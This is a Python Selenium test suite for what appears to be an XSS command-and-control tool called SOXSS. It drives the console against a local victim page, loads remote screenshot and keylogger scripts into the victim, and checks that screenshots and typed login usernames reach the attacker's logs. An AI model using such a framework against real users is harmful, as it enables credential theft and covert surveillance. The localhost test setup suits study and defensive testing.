import subprocess
import sys
import time
import unittest
import requests
from pathlib import Path

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait

ROOT = Path(__file__).resolve().parents[2]
RUNNER = ROOT / "tests" / "selenium" / "run_soxss_local.py"
SCREENSHOTS_DIR = ROOT / "console" / "screenshots"
LOGS_DIR = ROOT / "console" / "logs"


class SoxssSeleniumE2E(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        # Start SOXSS server in background
        cls.server_proc = subprocess.Popen(
            [sys.executable, str(RUNNER)],
            cwd=str(ROOT),
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
        )

        # Wait for server to be ready by polling the console endpoint
        cls._wait_server_ready(timeout=30)

        # Initialize Chrome driver
        cls.driver = webdriver.Chrome()
        cls.driver.set_window_size(1400, 900)
        cls.wait = WebDriverWait(cls.driver, 20)

        cls.driver.get("http://127.0.0.1:8002/index.html")
        cls.wait.until(EC.presence_of_element_located((By.ID, "inputText")))

        cls.driver.execute_script("window.open('http://127.0.0.1:8000/TestVictima.html', '_blank');")
        cls.driver.switch_to.window(cls.driver.window_handles[0])

        cls._wait_for_victim_session()

    @classmethod
    def _wait_server_ready(cls, timeout=30):
        """Poll console server until it responds"""
        deadline = time.time() + timeout
        while time.time() < deadline:
            try:
                response = requests.get("http://127.0.0.1:8002/", timeout=2)
                if response.status_code in [200, 404]:
                    return
            except (requests.ConnectionError, requests.Timeout):
                pass
            time.sleep(0.5)
        raise TimeoutError(f"SOXSS server did not start within {timeout} seconds")

    @classmethod
    def tearDownClass(cls):
        try:
            cls.driver.quit()
        finally:
            cls.server_proc.terminate()
            try:
                cls.server_proc.wait(timeout=8)
            except subprocess.TimeoutExpired:
                cls.server_proc.kill()

    @classmethod
    def _send_command(cls, command):
        input_box = cls.wait.until(EC.element_to_be_clickable((By.ID, "inputText")))
        input_box.clear()
        input_box.send_keys(command)
        input_box.send_keys(Keys.ENTER)
        time.sleep(0.7)

    @classmethod
    def _log_text(cls):
        return cls.driver.find_element(By.ID, "log").text

    @classmethod
    def _wait_for_victim_session(cls):
        for _ in range(25):
            cls._send_command("list")
            if "sid" in cls._log_text().lower() or "ip" in cls._log_text().lower():
                cls._send_command("change 0")
                return
            time.sleep(0.6)
        raise AssertionError("No victim session detected by 'list' command.")

    def test_01_console_lists_victim(self):
        self._send_command("list")
        log = self._log_text().lower()
        self.assertTrue("sid" in log or "ip" in log, "Expected victim metadata in console log")

    def test_02_screenshot_command_persists_png(self):
        before = set(SCREENSHOTS_DIR.glob("*.png")) if SCREENSHOTS_DIR.exists() else set()

        self._send_command("load http://127.0.0.1:8000/scripts/screenshot.js")
        time.sleep(2.5)  # Allow script to load and html2canvas CDN to load
        
        self._send_command("screenshot")

        deadline = time.time() + 40
        while time.time() < deadline:
            after = set(SCREENSHOTS_DIR.glob("*.png")) if SCREENSHOTS_DIR.exists() else set()
            new_files = after - before
            if new_files:
                return
            time.sleep(0.5)
        
        # Debugging: show what's in the directory
        print(f"[Screenshot Test] FAILED - No new PNG found")
        print(f"[Screenshot Test] console/screenshots/ exists: {SCREENSHOTS_DIR.exists()}")
        if SCREENSHOTS_DIR.exists():
            print(f"[Screenshot Test] Files in directory: {list(SCREENSHOTS_DIR.iterdir())}")
        print(f"[Screenshot Test] Console log:\n{self._log_text()}")
        
        self.fail("No new screenshot PNG file was generated in console/screenshots")

    def test_03_logger_command_persists_log(self):
        before_snap = {}
        if LOGS_DIR.exists():
            for p in LOGS_DIR.glob("*.log"):
                try:
                    before_snap[p] = p.stat().st_size
                except OSError:
                    pass

        self._send_command("load http://127.0.0.1:8000/scripts/logger.js")
        time.sleep(1.5)

        self.driver.switch_to.window(self.driver.window_handles[1])
        user_input = self.wait.until(EC.element_to_be_clickable((By.ID, "usuario")))
        pass_input = self.wait.until(EC.element_to_be_clickable((By.ID, "password")))
        user_input.clear()
        user_input.send_keys("selenium_user")
        pass_input.click()  # blur on usuario triggers logger

        self.driver.switch_to.window(self.driver.window_handles[0])

        deadline = time.time() + 20
        while time.time() < deadline:
            if LOGS_DIR.exists():
                for p in LOGS_DIR.glob("*.log"):
                    try:
                        new_size = p.stat().st_size
                        old_size = before_snap.get(p, 0)
                        if new_size > old_size:
                            if "selenium_user" in p.read_text(encoding="utf-8", errors="ignore"):
                                return
                    except OSError:
                        continue
            time.sleep(0.5)
        self.fail("No new logger evidence with test payload found in console/logs")


if __name__ == "__main__":
    unittest.main(verbosity=2)
